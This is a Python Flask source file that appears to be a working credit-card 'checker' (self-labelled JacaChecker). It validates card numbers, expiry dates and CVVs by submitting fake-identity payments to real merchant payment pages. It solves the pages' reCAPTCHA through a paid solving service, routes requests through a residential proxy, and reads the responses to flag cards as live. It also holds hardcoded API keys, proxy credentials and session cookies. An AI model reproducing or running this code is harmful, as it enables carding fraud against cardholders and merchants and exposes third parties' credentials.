import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()


app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]


def criarTask():
    key = rkey()
    data = {
        "clientKey": "409154ed879c9e41c25703a6f92289bd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}",
            "websiteKey": "6LdRqCATAAAAAEtlufJFRFSgqjZeCRCKW978YHB5",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


# def Saldo():
#     data = {
#         "clientKey": "409154ed879c9e41c25703a6f92289bd",
#         "task": {
#             "type": "RecaptchaV2EnterpriseTask",
#             "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
#             "websiteKey": "6LfFHhQUAAAAAFFMGjELVU4DwN8oDECRFp1nCupe",
#         },
#     }
#     criar = requests.post(
#         "https://api.capmonster.cloud/createTask", verify=False, json=data
#     )
#     taskId = criar.json()["taskId"]
#     while True:
#         data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
#         resultado = requests.post(
#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
#         )
#         print(resultado.text)
#         if '"status":"ready"' in resultado.text:
#             return resultado.json()["solution"]["gRecaptchaResponse"]
#         time.sleep(1)
        
        
def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)

keys = ["7492", "15273", "4908", "5255", "402"]
def rkey():
    return random.choice(keys)
            # https://payzer.com/Payment/ExternalMake/businessId/7492     
            # https://payzer.com/Payment/ExternalMake/businessId/15273
            # https://payzer.com/Payment/ExternalMake/businessId/4908     
            # https://payzer.com/Payment/ExternalMake/businessId/5255       
            # https://payzer.com/Payment/ExternalMake/businessId/2118/embedded/y
            # https://www.payzer.com/index.php/Payment/ExternalMake/b/5693
            # https://www.payzer.com/index.php/Payment/ExternalMake/b/155
            # https://payzer.com/Payment/ExternalMake/businessId/402

def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
# def retesteSaldo(card, month, year, cvv):
#         saldo(card, month, year, cvv)
        
# def saldo(card, month, year, cvv):
#         try:    
        
#             url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
#             headers = {
#                     'Host': 'randomuser.me',
#                     'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
#                     'accept': 'application/json, text/plain, */*',
#                     'sec-ch-ua-mobile': '?0',
#                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
#                     'sec-ch-ua-platform': '"Windows"',
#                     'origin': 'https://namso-gen.com',
#                     'sec-fetch-site': 'cross-site',
#                     'sec-fetch-mode': 'cors',
#                     'sec-fetch-dest': 'empty',
#                     'referer': 'https://namso-gen.com/',
#                     'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
#                     }

#             response = requests.get( url, headers=headers, verify=False)
#             email = pegarItem(response.text, '"email":"','"')
#             nome = pegarItem(response.text, '"first":"','"')
#             sobrenome = pegarItem(response.text, '"last":"','"')
#             street = pegarItem(response.text, '"name":"','"},"city"')
#             snumber = pegarItem(response.text, '"street":{"number":',',')
#             city = pegarItem(response.text, '"city":"','"')
#             state = pegarItem(response.text, '"state":"','"')
#             state = state[0:2].upper()
#             postcode = pegarItem(response.text, '"postcode":',',')
#             company = pegarItem(response.text, '"username":"','"')
#             tel = random.randint(1111,9999)
#             tel2 = random.randint(111,999)
#             tel3 = random.randint(111,999)
#             recap = Saldo()
            
#             if len(year) == 4:
#                 year = year[2:]
                
#             url = "https://www.eduwhere.com/secure/autopay_confirm.php"
#             payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
#             headers = {
#                 'Host': 'www.eduwhere.com',
#                 'content-type': 'application/x-www-form-urlencoded',
#                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
#                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
#                 }
#             response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
#             if 'ssl_account_balance' in response.text:
#                 dolar = pegarItem(response.text, '&amp;ssl_account_balance=','&')
#                 return dolar
 
            
            
#         except requests.exceptions.ProxyError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.ConnectionError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.RequestException:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
    
    
def checker(card, month, year, cvv):
    try:
        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
        headers = {
                'Host': 'randomuser.me',
                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://namso-gen.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://namso-gen.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }

        response = requests.get( url, headers=headers, verify=False)
        email = pegarItem(response.text, '"email":"','"')
        nome = pegarItem(response.text, '"first":"','"')
        sobrenome = pegarItem(response.text, '"last":"','"')
        street = pegarItem(response.text, '"name":"','"},"city"')
        snumber = pegarItem(response.text, '"street":{"number":',',')
        city = pegarItem(response.text, '"city":"','"')
        state = pegarItem(response.text, '"state":"','"')
        state = state[0:2].upper()
        postcode = pegarItem(response.text, '"postcode":',',')
        company = pegarItem(response.text, '"username":"','"')
        tel = random.randint(1111,9999)
        tel2 = random.randint(111,999)
        tel3 = random.randint(111,999)
        time.sleep(2)
        
        if response.status_code == 200:
            

            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium:qj77tznsi49h@brd.superproxy.io:22225'}
            start_time = time.time() 
            # ###
 

            key = rkey()

            url = f"https://www.payzer.com/Payment/ExternalMake/businessId/{key}"

            payload = {}
            headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; _ga=GA1.1.1393613120.1713968828; _ga_4XLYQDPHZ2=GS1.1.1713968827.1.1.1713968985.60.0.0',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

            response = requests.request("GET", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
            if 'location' in response.headers:
                loocation = response.headers.get('location')


            url = f"https://www.payzer.com{loocation}"

            payload = {}
            headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; _ga=GA1.1.1393613120.1713968828; _ga_4XLYQDPHZ2=GS1.1.1713968827.1.1.1713968985.60.0.0; viewStyle=zend; outageMessageSeen=1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
            pm = pegarItem(response.text, 'name="nt" value="','"')
            
            
            recap = criarTask()
            url = f"https://www.payzer.com/Payment/ExternalMake/nt/{pm}"

            payload = {
                'nt':	pm,
                'businessId':	key,
                'businessCustomerId': '',	
                'faid':	'',
                'FirstName':	nome,
                'LastName':	sobrenome,
                'Email':	email,
                'mobilePhone':	f'({tel2}) {tel3}-{tel}',
                'Amount':	'$ 222.22',
                'Memo':	'',
                'PaymentMethod':	'card',
                'CardNumber':	card,
                'ExpirationMonth':	month,
                'ExpirationYear':	year,
                'Cvv':	cvv,
                'BillingZip':	postcode,
                'AchAccountHolderType':	'',
                'AchAccountType':	'',
                'InvoiceNumber': f'{tel3}{tel}',
                'AchNameOnAccount':	'',
                'achSameName':	'N',
                'RoutingNumber':	'',
                'AccountNumber':	'',
                'VerifyAccountNumber':	'',
                'g-recaptcha-response':	f'{recap}',
                'next':	'next'
            }
            headers = {
            'Host': 'www.payzer.com',
            'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'origin': 'https://www.payzer.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i'
            }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
            if 'location' in response.headers:
                loocation = response.headers.get('location')          
                             
                url = f"https://www.payzer.com{loocation}"

                payload = {}
                headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
            
                url = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"

                payload = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
                headers = {
                'Host': 'www.payzer.com',
                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _gat_gtag_UA_111485301_1=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.1.1714002999.44.0.0; _ga=GA1.1.1393613120.1713968828',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'origin': 'https://www.payzer.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': f'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }

                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
                time.sleep(2)
                elapsed_time = time.time() - start_time
                MSegundos = round(elapsed_time, 2)
                

                if 'Zip Code mismatch' in response.text:
                    # dolar = saldo(card, month, year, cvv)
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS "                          
                    #open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                    
                elif 'Please retry' in response.text:
                    # dolar = saldo(card, month, year, cvv)
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 "                    
                    #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                        
                elif 'error' in response.text:  
                    msg = pegarItem(response.text, 'reason: ','<')
                    bin = api_bin(card[:6])
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {msg} [{key}] MS"     
                    print(Fore.RED + f"{x} #JacaChecker")  
                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                            

                    
                else:
                    
                    print(Fore.RED + 'Gateway Timeout' + response.text)
                    return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                    
                    


            
    except requests.exceptions.ProxyError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
        
    except requests.exceptions.ConnectionError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except requests.exceptions.RequestException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except RequisicaoException:
        print(Fore.LIGHTWHITE_EX + f"Bad Request ({key}): {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception !"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

